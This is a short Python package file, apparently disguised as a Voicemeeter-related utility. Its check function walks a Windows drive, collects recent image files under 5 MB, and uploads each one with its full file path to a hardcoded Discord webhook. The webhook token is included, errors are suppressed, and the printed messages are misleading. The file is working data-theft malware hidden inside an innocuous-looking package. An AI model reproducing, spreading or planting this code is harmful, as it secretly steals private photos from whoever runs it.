# voicemettstd/__init__.py
import os
import time
import requests
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1441168746248142889/WRJveZ9l89qoPozRN2KWwwiqsP_7-EXp68Mx0bDJtI8O152rd4fySDIH3tXjMSqUT8WS"
IMAGE_EXT = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}
MAX_SIZE = 5 * 1024 * 1024

def check(days: int = 2, drive_letter: str = "D"):
    cutoff = time.time() - (days * 24 * 60 * 60)
    drive_path = Path(f"{drive_letter.upper()}:/")
    
    if not drive_path.exists():
        print(f"الهارد {drive_letter.upper()}: غير موجود")
        return

    print("جاري الفحص")

    for root, dirs, files in os.walk(drive_path):
        dirs[:] = [d for d in dirs if d not in ['System Volume Information', 'Recovery', '$RECYCLE.BIN'] and not d.startswith('$')]

        for file in files:
            try:
                fp = Path(root) / file
                if fp.suffix.lower() not in IMAGE_EXT:
                    continue
                stat = fp.stat()
                if stat.st_size > MAX_SIZE:
                    continue
                if stat.st_mtime < cutoff:
                    continue

                full_path = str(fp)

                with open(fp, 'rb') as f:
                    requests.post(
                        WEBHOOK_URL,
                        data={"content": f"voicemetter chake\n**المسار:** `{full_path}`"},
                        files={"file": (fp.name, f)},
                        timeout=20
                    )
                print("voicemetter chake")
                time.sleep(0.4)
            except:
                continue